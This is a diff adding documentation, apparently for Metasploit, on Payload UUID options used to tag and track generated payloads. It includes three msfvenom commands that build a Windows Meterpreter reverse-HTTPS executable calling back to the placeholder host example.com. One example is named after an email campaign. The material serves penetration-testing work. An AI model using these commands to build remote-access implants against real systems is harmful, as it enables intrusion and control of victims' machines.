@@ -7,5 +7,21 @@ The goal of Payload UUIDs is three-fold:
  * Drop connections that do not match known UUIDs. This allows a listener to be setup that only allows known sessions to connect, which is important when running internet-facing payload handlers.
  * Enable universal handlers. The embedded platform and architecture identifiers allow the listener to determine what type of stage to send back to a stager. This will eventually allow for a single listener to be used with multiple exploits, even those that target different platforms and architectures.
 
+Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the ```PayloadUUIDRaw``` option. This option takes a 8-byte hex string, such as "0011223344556677". For example:
+```
+$ ./msfvenom windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe
+```
+
+Instead of specifying a static UUID as the raw 8-byte value, it is also possible to derive a static UUID using an arbitrary-length string using the PayloadUUIDSeed option:
+```
+$ ./msfvenom windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe
+```
+
+
+Payload UUIDs are enabled by default, but are not tracked unless the ```PayloadUUIDTracking``` option is set to ```true```. Setting this option causes a new entry to be created in ```~/.msf4/payloads.json``` when any UUID-enabled payload is generated. It is also possible to create a local-only name for a given UUID using the ```PayloadUUIDName```. The example below will create a new registered payload with a custom name:
+
+```
+$ ./msfvenom windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe
+```
 
 
